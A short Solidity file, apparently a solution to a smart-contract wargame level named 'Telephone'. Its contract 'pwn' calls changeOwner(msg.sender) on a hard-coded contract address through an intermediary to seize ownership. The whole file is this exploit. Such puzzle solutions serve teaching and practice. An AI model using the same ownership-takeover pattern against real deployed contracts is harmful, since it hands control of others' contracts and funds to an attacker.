// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Itelephone {
    function changeOwner(address _owner) external;
}

contract pwn {
    address addr = 0xB0Ea2Df4D76200D659FAeAD23dd4c612B2511bF0;

    function exploit() public {
        Itelephone(addr).changeOwner(msg.sender);
    }
}
